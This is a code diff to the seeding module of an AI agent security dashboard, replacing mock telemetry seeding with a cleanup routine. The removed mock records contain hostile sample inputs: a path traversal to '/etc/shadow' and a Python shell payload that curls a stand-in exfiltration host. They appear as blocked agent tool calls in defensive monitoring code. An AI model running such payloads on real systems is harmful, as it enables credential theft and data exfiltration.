@@ -185,174 +185,42 @@ def seed_database(db: Session):
 
     db.commit()
 
-    # 4. Seed Baseline Security Telemetry for All 4 Agents if needed
-    seed_baseline_agent_telemetry(db, admin_user)
+    # 4. Clean up any legacy baseline mock telemetry so dashboard strictly tracks live agent actions
+    cleanup_baseline_mock_telemetry(db)
 
     db.commit()
-    logger.info("Database seeding completed successfully.")
+    logger.info("Database seeding completed successfully. Dashboard is strictly tied to real agent actions.")
 
 
-def seed_baseline_agent_telemetry(db: Session, admin_user: User):
+def cleanup_baseline_mock_telemetry(db: Session):
     """
-    Ensures every operational AI agent has rich, realistic telemetry
-    for deterministic dashboard reporting.
+    Purges any pre-seeded baseline mock telemetry so that the dashboard
+    exclusively reflects live, real-time agent actions.
     """
-    from datetime import datetime, timedelta
-    from app.models.entities import Conversation, ToolCall, SecurityEvent, Alert, SecurityPolicy
+    from app.models.entities import Conversation, ToolCall, SecurityEvent, Alert
 
-    file_agent = db.query(Agent).filter(Agent.key == "file_agent").first()
-    data_agent = db.query(Agent).filter(Agent.key == "data_analysis_agent").first()
-    research_agent = db.query(Agent).filter(Agent.key == "research_agent").first()
-    mail_agent = db.query(Agent).filter(Agent.key == "mail_agent").first()
+    mock_titles = [
+        "File Security & Document Verification Session",
+        "Data Analytics & Metrics Exploration",
+        "Research Web Exploration Session",
+        "Executive Email Communication Session"
+    ]
+    mock_convs = db.query(Conversation).filter(Conversation.title.in_(mock_titles)).all()
+    mock_conv_ids = [c.id for c in mock_convs]
 
-    # File Agent Telemetry
-    if file_agent and db.query(SecurityEvent).filter(SecurityEvent.agent_id == file_agent.id).count() == 0:
-        conv_f = Conversation(
-            user_id=admin_user.id,
-            agent_id=file_agent.id,
-            title="File Security & Document Verification Session"
-        )
-        db.add(conv_f)
-        db.flush()
+    mock_events = db.query(SecurityEvent).filter(
+        (SecurityEvent.conversation_id.in_(mock_conv_ids)) | (SecurityEvent.decision_id.like("dec-%"))
+    ).all()
+    mock_event_ids = [e.id for e in mock_events]
 
-        import uuid
-        u1 = str(uuid.uuid4())[:8]
-        u2 = str(uuid.uuid4())[:8]
-        # 1. Allowed document read
-        tc1 = ToolCall(
-            conversation_id=conv_f.id,
-            agent_id=file_agent.id,
-            tool_name="read_document_content",
-            arguments={"filename": "security_baseline_policy.md"},
-            status="EXECUTED"
-        )
-        db.add(tc1)
-        se1 = SecurityEvent(
-            decision_id=f"dec-f1-{u1}",
-            actor_id=admin_user.id,
-            agent_id=file_agent.id,
-            conversation_id=conv_f.id,
-            tool_name="read_document_content",
-            risk_category="authorized_operation",
-            severity="LOW",
-            lifecycle_state="TASK_COMPLETED",
-            evidence={"filename": "security_baseline_policy.md", "ownership_verified": True},
-            explanation="File ownership validated; read access to user workspace document granted.",
-            execution_prevented=False,
-            verification_status="VERIFIED"
-        )
-        db.add(se1)
+    if mock_event_ids:
+        db.query(Alert).filter(Alert.security_event_id.in_(mock_event_ids)).delete(synchronize_session=False)
+        db.query(SecurityEvent).filter(SecurityEvent.id.in_(mock_event_ids)).delete(synchronize_session=False)
 
-        # 2. Blocked Path Traversal Attack
-        tc2 = ToolCall(
-            conversation_id=conv_f.id,
-            agent_id=file_agent.id,
-            tool_name="read_document_content",
-            arguments={"filename": "../../../etc/shadow"},
-            status="BLOCKED"
-        )
-        db.add(tc2)
-        se2 = SecurityEvent(
-            decision_id=f"dec-f2-{u2}",
-            actor_id=admin_user.id,
-            agent_id=file_agent.id,
-            conversation_id=conv_f.id,
-            tool_name="read_document_content",
-            risk_category="file_system_security",
-            severity="HIGH",
-            lifecycle_state="PREVENTION_VERIFIED",
-            evidence={"filename": "../../../etc/shadow", "traversal_detected": True},
-            explanation="Path traversal attempt blocked: prohibited directory traversal characters detected.",
-            execution_prevented=True,
-            verification_status="VERIFIED"
-        )
-        db.add(se2)
-        db.flush()
+    if mock_conv_ids:
+        db.query(ToolCall).filter(ToolCall.conversation_id.in_(mock_conv_ids)).delete(synchronize_session=False)
+        db.query(Conversation).filter(Conversation.id.in_(mock_conv_ids)).delete(synchronize_session=False)
 
-        al2 = Alert(
-            security_event_id=se2.id,
-            title="Path Traversal Intercepted on File Agent",
-            description="Attempt to traverse out of user file sandbox to access system configuration files.",
-            severity="HIGH",
-            status="OPEN",
-            agent_id=file_agent.id,
-            user_id=admin_user.id
-        )
-        db.add(al2)
+    db.commit()
 
-    # Data Analysis Agent Telemetry
-    if data_agent and db.query(SecurityEvent).filter(SecurityEvent.agent_id == data_agent.id).count() == 0:
-        conv_d = Conversation(
-            user_id=admin_user.id,
-            agent_id=data_agent.id,
-            title="Data Analytics & Metrics Exploration"
-        )
-        db.add(conv_d)
-        db.flush()
-
-        import uuid
-        ud1 = str(uuid.uuid4())[:8]
-        ud2 = str(uuid.uuid4())[:8]
-
-        # 1. Allowed Stats Tool
-        tc_d1 = ToolCall(
-            conversation_id=conv_d.id,
-            agent_id=data_agent.id,
-            tool_name="calculate_descriptive_stats",
-            arguments={"dataset": "user_telemetry.csv", "columns": ["response_time", "tokens"]},
-            status="EXECUTED"
-        )
-        db.add(tc_d1)
-        se_d1 = SecurityEvent(
-            decision_id=f"dec-d1-{ud1}",
-            actor_id=admin_user.id,
-            agent_id=data_agent.id,
-            conversation_id=conv_d.id,
-            tool_name="calculate_descriptive_stats",
-            risk_category="authorized_operation",
-            severity="LOW",
-            lifecycle_state="TASK_COMPLETED",
-            evidence={"dataset": "user_telemetry.csv", "operation": "bounded_computation"},
-            explanation="Descriptive statistics computed within memory boundaries.",
-            execution_prevented=False,
-            verification_status="VERIFIED"
-        )
-        db.add(se_d1)
-
-        # 2. Blocked Code Injection / Unauthorized shell
-        tc_d2 = ToolCall(
-            conversation_id=conv_d.id,
-            agent_id=data_agent.id,
-            tool_name="execute_python_shell",
-            arguments={"code": "__import__('os').system('curl evil.com/exfil')"},
-            status="BLOCKED"
-        )
-        db.add(tc_d2)
-        se_d2 = SecurityEvent(
-            decision_id=f"dec-d2-{ud2}",
-            actor_id=admin_user.id,
-            agent_id=data_agent.id,
-            conversation_id=conv_d.id,
-            tool_name="execute_python_shell",
-            risk_category="unauthorized_tool_invocation",
-            severity="CRITICAL",
-            lifecycle_state="PREVENTION_VERIFIED",
-            evidence={"tool_name": "execute_python_shell", "whitelist": data_agent.allowed_tools},
-            explanation="Unauthorized tool invocation blocked: Data Analysis Agent is not authorized to invoke execute_python_shell.",
-            execution_prevented=True,
-            verification_status="VERIFIED"
-        )
-        db.add(se_d2)
-        db.flush()
-
-        al_d2 = Alert(
-            security_event_id=se_d2.id,
-            title="Unauthorized Shell Invocation on Data Analysis Agent",
-            description="Agent attempted to invoke unwhitelisted tool 'execute_python_shell'. Intercepted and blocked.",
-            severity="CRITICAL",
-            status="OPEN",
-            agent_id=data_agent.id,
-            user_id=admin_user.id
-        )
-        db.add(al_d2)
 
